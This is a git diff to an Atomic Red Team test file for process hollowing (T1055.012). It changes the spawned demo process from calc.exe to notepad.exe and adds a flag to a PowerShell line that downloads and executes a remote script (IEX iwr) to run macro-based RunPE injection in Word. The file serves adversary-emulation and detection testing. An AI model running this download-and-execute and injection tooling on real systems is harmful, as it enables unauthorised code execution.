@@ -20,11 +20,11 @@ atomic_tests:
     sponsor_binary_path:
       description: Path of the sponsor binary (executable that will host the binary)
       type: string
-      default: C:\Windows\System32\calc.exe
+      default: C:\Windows\System32\notepad.exe
     spawnto_process_name:
       description: Name of the process to spawn
       type: string
-      default: calc
+      default: notepad
   executor:
     command: |
       . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
@@ -36,7 +36,7 @@ atomic_tests:
 - name: RunPE via VBA
   auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
   description: |
-    This module executes calc.exe from within the WINWORD.EXE process
+    This module executes notepad.exe from within the WINWORD.EXE process
   supported_platforms:
   - windows
   input_arguments:
@@ -59,6 +59,6 @@ atomic_tests:
       Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1") 
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing) 
       Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"
     name: powershell
